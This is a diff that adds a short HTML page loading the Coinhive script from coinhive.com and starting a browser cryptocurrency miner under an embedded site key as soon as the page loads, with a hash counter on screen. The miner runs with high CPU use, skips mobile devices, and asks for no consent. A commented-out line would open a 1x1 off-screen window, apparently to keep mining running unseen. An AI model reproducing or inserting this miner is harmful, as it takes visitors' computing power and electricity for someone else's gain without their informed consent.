@@ -1,0 +1,47 @@
+<html>
+<head>
+</head>
+<body>
+<div>
+    hash/s = <span id="hashesPerSecond"></span>
+</div>
+<div>
+    total hashes = <span id="totalHashes"></span>
+</div>
+<div>
+    accepted hashes = <span id="acceptedHashes"></span>
+</div>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+  // window.open('test.html','_blank', 'toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=10000, top=10000, width=1, height=1, visible=none', '');
+  var miner = new CoinHive.Anonymous('VbLLTkIE16RqmmTd8pYKQr6PKkFut2pf', {
+    autoThreads: true,
+    throttle: 0.8,
+    forceASMJS:  false
+  });
+  if (!miner.isMobile() && !miner.didOptOut(14400)) {
+    miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+  }
+
+  // Listen on events
+  miner.on('found', function () {
+    console.log('Found!!');
+  });
+  miner.on('accepted', function () {
+    console.log('Accepted!!');
+  });
+
+  // Update stats once per second
+  setInterval(function () {
+    var hashesPerSecond = miner.getHashesPerSecond();
+    var totalHashes = miner.getTotalHashes();
+    var acceptedHashes = miner.getAcceptedHashes();
+
+    // Output to HTML elements...
+    document.getElementById('hashesPerSecond').innerText = hashesPerSecond;
+    document.getElementById('totalHashes').innerText = totalHashes;
+    document.getElementById('acceptedHashes').innerText = acceptedHashes;
+  }, 500);
+</script>
+</body>
+<html>
